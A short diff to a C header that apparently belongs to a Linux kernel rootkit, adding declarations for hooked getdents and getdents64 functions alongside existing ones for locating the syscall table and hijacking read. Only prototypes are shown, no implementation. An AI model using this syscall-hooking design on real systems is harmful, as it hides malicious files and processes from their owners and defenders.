@@ -11,3 +11,9 @@ void get_kallsyms_funcptr(void);
 void get_syscall_table(void);
 
 void hijack_read(void);
+
+
+static long hacked_getdents64(const struct pt_regs *pt_regs);
+static long hacked_getdents(const struct pt_regs *pt_regs);
+void replace_getdents(void);
+void clear_getdents(void);
